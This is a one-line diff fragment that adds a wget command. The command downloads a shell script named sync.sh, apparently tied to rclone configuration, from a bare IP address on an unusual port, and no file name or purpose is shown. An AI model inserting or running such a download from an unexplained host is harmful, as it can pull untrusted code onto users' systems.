@@ -1,0 +1,1 @@
+wget http://112.137.129.161:11908/config_rclone/sync.sh
